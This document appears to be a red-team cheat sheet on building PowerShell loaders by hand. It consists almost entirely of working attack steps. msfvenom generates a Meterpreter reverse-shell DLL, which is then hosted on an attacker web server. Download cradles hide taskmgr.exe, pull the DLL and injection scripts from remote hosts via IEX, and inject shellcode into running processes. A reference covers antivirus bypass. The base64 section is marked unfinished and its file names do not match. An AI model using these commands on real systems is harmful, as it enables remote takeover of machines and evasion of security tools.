# Crafting Manually

## 01 - Powershell Scripts

### 1.1 - Reflective DLL Injection

#### 1.1.1 - Simple Reflective DLL Injection

`$ msfvenom -p windows/x64/meterpreter/reverse_http lhost=<IP> lport=80 exitfunc=thread -f dll -o shellcode.dll`

`$ sudo python -m http.server 80`

`$ cat download-cradle.ps1`

---

```powershell
Start-Process -WindowStyle hidden -FilePath taskmgr.exe

$bytes = ((New-Object Net.WebClient).DownloadData("http://<IP>/shellcode.dll"))

IEX((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/charnim/Invoke-ReflectivePEInjection.ps1/main/Invoke-ReflectivePEInjection.ps1"))

$procid = (Get-Process -Name taskmgr).Id

Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
```

#### 1.1.2 - Reflective DLL Injection with encoded base64 shellcode DLL

TODO: Figure out the base64 encoding problem with DLL files

`$ msfvenom -p windows/x64/meterpreter/reverse_http lhost=<IP> lport=80 EXITFUNC=thread -f dll -o shellcode.dll`

`$ pwsh`

`PS /home/user> $file = 'shellcode.bin'`

`PS /home/user> [byte[]] $raw_bytes = [IO.File]::ReadAllBytes($file)`

`PS /home/user> $encoded = [Convert]::ToBase64String($raw_bytes)`

`PS /home/user> [IO.File]::WriteAllBytes('shellcode-encodedb64.txt', $encoded)`

`PS /home/user> exit`

`$ sudo python -m http.server 80`

`$ cat download-cradle.ps1`

---

```powershell
Start-Process -WindowStyle hidden -FilePath taskmgr.exe  
  
$bytes = ((New-Object Net.WebClient).DownloadData("http://<IP>/shellcode-encodedb64.txt"))  
  
$decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($bytes))  
  
IEX((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/charnim/Invoke-ReflectivePEInjection.ps1/main/Invoke-ReflectivePEInjection.ps1"))  
  
$procid = (Get-Process -Name taskmgr).Id  
  
Invoke-ReflectivePEInjection -PEBytes $decoded -ProcId $procid
```

### 1.2 - Invoke-Shellcode

```powershell
IEX((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/main/empire/server/data/module_source/code_execution/Invoke-Shellcode.ps1"))

$procid = (Get-Process -Name explorer).Id

Invoke-Shellcode -ProcessId $procid -Shellcode @(<ps1_shellcode_format>)
```

## References

- [Invoke-ReflectivePEInjection](https://github.com/charnim/Invoke-ReflectivePEInjection.ps1)

- [Adamn Chester (XPN) YouTube Video: Bypass AV with Invoke-ReflectivePEInjection](https://www.youtube.com/watch?v=byMBx4q-vYo)

- [sRDI](https://github.com/monoxgas/sRDI)